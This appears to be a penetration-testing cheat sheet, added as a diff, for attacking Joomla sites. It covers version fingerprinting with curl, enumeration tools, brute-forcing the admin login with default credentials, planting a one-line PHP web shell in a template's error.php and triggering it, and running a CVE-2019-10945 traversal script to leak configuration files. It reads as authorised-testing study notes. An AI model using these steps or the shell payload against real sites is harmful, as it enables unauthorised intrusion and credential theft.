@@ -1,0 +1,127 @@
+🧠 Joomla — "Got This, Do That" Breakdown
+🎯 Phase 1: Discovery & Identification
+🔍 Goal: Confirm it's Joomla and get version/theme/extension info.
+✅ Got This: robots.txt contains /administrator/, /modules/, /plugins/, etc.
+➡️ Do That: Fingerprint as Joomla. These are default Joomla paths.
+
+✅ Got This: Source code shows:
+html
+Copy
+Edit
+<meta name="generator" content="Joomla! - Open Source Content Management" />
+➡️ Do That: Confirm Joomla via meta tag. Mark it in your notes.
+
+✅ Got This: Access to /README.txt or /administrator/manifests/files/joomla.xml
+➡️ Do That: Pull Joomla version — this is accurate and version-specific.
+
+✅ Got This: /media/system/js/ or /plugins/system/cache/cache.xml
+➡️ Do That: Use these to further confirm version (approximate if needed).
+
+🔁 Tools & Commands for Discovery
+bash
+Copy
+Edit
+curl -s http://target/ | grep Joomla
+curl -s http://target/README.txt | head
+curl -s http://target/administrator/manifests/files/joomla.xml
+curl -s http://target/plugins/system/cache/cache.xml
+🧰 Phase 2: Enumeration
+🔎 Tools:
+droopescan (Python3): Version and components
+
+joomlascan.py (Python2): Components, accessible dirs, possible info leaks
+
+✅ Got This: droopescan finds possible versions like 3.8.13, 3.9.4
+➡️ Do That: Narrow it down using joomla.xml or README.txt.
+
+✅ Got This: JoomlaScan shows component paths like /index.php?option=com_admin
+➡️ Do That: Visit those URLs, see what’s exposed, look for LFI/RCE/SQLi in those extensions.
+
+✅ Got This: JoomlaScan finds explorable directories (components/, plugins/, etc.)
+➡️ Do That: Manually browse or brute force dirs for readme.txt, config files, sensitive info.
+
+🧪 Brute Force Login (Optional)
+✅ Got This: Joomla login page (/administrator)
+➡️ Do That: Try default creds (admin:admin) or use script:
+
+bash
+Copy
+Edit
+python3 joomla-brute.py -u http://target -w /path/to/wordlist.txt -usr admin
+💥 Phase 3: Attack Paths
+🧱 Built-in Functionality Exploitation (Post-Login)
+✅ Got This: Valid Joomla Admin creds
+➡️ Do That:
+
+Go to: /administrator/index.php?option=com_templates
+
+Choose a template like protostar
+
+Edit a page like error.php
+
+Drop shell:
+
+php
+Copy
+Edit
+<?php system($_GET['shell']); ?>
+Trigger:
+
+bash
+Copy
+Edit
+curl http://target/templates/protostar/error.php?shell=id
+🔁 Note: Clean up your PHP shell after testing, and log artifact in report.
+
+🧨 Known Vulnerability Exploitation
+🔹 CVE-2019-10945 – Joomla 1.5.0–3.9.4
+➡️ Directory traversal + authenticated file deletion.
+
+If version == 3.9.4 and creds work:
+
+bash
+Copy
+Edit
+python2.7 joomla_dir_trav.py --url "http://target/administrator/" --username admin --password admin --dir /
+🎯 Can use to leak files like configuration.php, db creds, etc.
+
+🔁 Recap of Artifacts to Track
+Admin login panel found: /administrator
+
+Version fingerprinted: Joomla 3.9.4
+
+Valid creds: admin:admin
+
+Template modified: error.php (track filename + hash)
+
+CVE used: CVE-2019-10945
+
+RCE via template shell: ✅
+
+Directory traversal: ✅ (log what files you touched)
+
+🧭 Workflow Cheat Sheet
+mathematica
+Copy
+Edit
+→ Run Nmap & visit robots.txt / page source
+→ Confirm Joomla via meta tag or README.txt
+→ Run droopescan & JoomlaScan
+→ Check /administrator login panel
+→ Try default creds or brute-force
+→ If logged in:
+    → Navigate to Templates > Edit error.php
+    → Drop shell & test execution
+→ Check Joomla version for CVEs (e.g., CVE-2019-10945)
+→ Exploit if valid
+→ Clean up, document shell/drop
+🕵 Hidden Patterns & Hints
+README.txt, joomla.xml, and cache.xml will always show version hints
+
+Admin panel often at /administrator (not /admin)
+
+Default creds still shockingly common
+
+Template RCE is the most direct post-auth attack path
+
+If no creds → try LFI via components/ or vulnerable plugins found in joomlascan.py
